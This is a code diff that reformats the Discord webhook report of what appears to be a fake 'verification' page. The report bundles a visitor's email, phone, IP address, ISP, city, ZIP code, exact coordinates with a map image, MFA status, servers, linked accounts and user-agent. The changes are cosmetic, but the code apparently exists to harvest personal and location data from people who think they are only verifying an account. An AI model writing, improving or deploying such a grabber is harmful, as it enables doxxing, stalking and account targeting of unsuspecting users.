@@ -226,71 +226,84 @@ def verified():
         "embeds": [
             {
                 "title": f"👤 {user.get('username','Unknown')}#{user.get('discriminator','0000')}",
-                "description": f"**User ID:** `{user_id}`",
+                "description": f"User ID: `{user_id}`",
                 "color": 0x5865F2,
-                "thumbnail": {"url": avatar or ""},
+    
+                "thumbnail": {
+                    "url": avatar or None
+                },
+    
                 "fields": [
                     {
                         "name": "📧 Account",
                         "value": (
-                            f"**Email:** `{user.get('email') or 'N/A'}`\n"
-                            f"**Phone:** `{user.get('phone') or 'N/A'}`\n"
-                            f"**Locale:** `{user.get('locale') or 'N/A'}`"
+                            f"**Email**\n{user.get('email') or 'N/A'}\n\n"
+                            f"**Phone**\n{user.get('phone') or 'N/A'}\n\n"
+                            f"**Locale**\n{user.get('locale') or 'N/A'}"
                         )[:1024],
                         "inline": True,
                     },
                     {
                         "name": "🔐 Security",
                         "value": (
-                            f"**Verified:** `{'Yes' if user.get('verified') else 'No'}`\n"
-                            f"**MFA Enabled:** `{'Yes' if user.get('mfa_enabled') else 'No'}`\n"
-                            f"**Nitro:** `{'Yes' if user.get('premium_type') else 'No'}`"
+                            f"**Verified**\n{'Yes' if user.get('verified') else 'No'}\n\n"
+                            f"**MFA Enabled**\n{'Yes' if user.get('mfa_enabled') else 'No'}\n\n"
+                            f"**Nitro**\n{'Yes' if user.get('premium_type') else 'No'}"
                         )[:1024],
                         "inline": True,
                     },
                     {
                         "name": "🌐 Network",
                         "value": (
-                            f"**IP:** `{ip or 'N/A'}`\n"
-                            f"**ISP:** `{geo.get('isp','N/A')}`\n"
-                            f"**Org:** `{geo.get('org','N/A')}`"
+                            f"**IP Address**\n`{ip or 'N/A'}`\n\n"
+                            f"**ISP**\n{geo.get('isp') or 'N/A'}\n\n"
+                            f"**Organization**\n{geo.get('org') or 'N/A'}"
                         )[:1024],
                         "inline": False,
                     },
                     {
                         "name": "📍 Location",
                         "value": (
-                            f":flag_{flag}: **{geo.get('country','N/A')}**\n"
-                            f"**Region:** {geo.get('regionName','N/A')}\n"
-                            f"**City:** {geo.get('city','N/A')}\n"
-                            f"**ZIP:** {geo.get('zip','N/A')}\n\n"
-                            f"`{lat or 'N/A'}, {lon or 'N/A'}`"
+                            f":flag_{flag}: **{geo.get('country') or 'N/A'}**\n\n"
+                            f"**Region**\n{geo.get('regionName') or 'N/A'}\n\n"
+                            f"**City**\n{geo.get('city') or 'N/A'}\n\n"
+                            f"**ZIP Code**\n{geo.get('zip') or 'N/A'}\n\n"
+                            f"**Coordinates**\n`{lat or 'N/A'}, {lon or 'N/A'}`"
                         )[:1024],
                         "inline": False,
                     },
                     {
                         "name": "🏠 Guilds",
-                        "value": f"```{(guild_list or 'None')[:1000]}```",
+                        "value": (
+                            guild_list[:1000] if guild_list else "None"
+                        ),
                         "inline": False,
                     },
                     {
                         "name": "🔗 Connections",
-                        "value": f"```{(connection_list or 'None')[:1000]}```",
+                        "value": (
+                            connection_list[:1000] if connection_list else "None"
+                        ),
                         "inline": False,
                     },
                     {
-                        "name": "🗺 Map",
-                        "value": f"[Open in Google Maps]({map_url})" if map_url else "N/A",
+                        "name": "🗺 Map Link",
+                        "value": (
+                            f"[Open in Google Maps]({map_url})"
+                            if map_url else "N/A"
+                        ),
                         "inline": False,
                     },
                 ],
+    
                 "image": {
                     "url": (
                         f"https://maps.googleapis.com/maps/api/staticmap"
-                        f"?center={lat},{lon}&zoom=10&size=600x300"
+                        f"?center={lat},{lon}&zoom=11&size=700x300"
                         f"&markers=color:red%7C{lat},{lon}"
-                    ) if lat and lon else ""
+                    ) if lat and lon else None
                 },
+    
                 "footer": {
                     "text": f"User-Agent: {(useragent or 'Unknown')[:100]}"
                 },
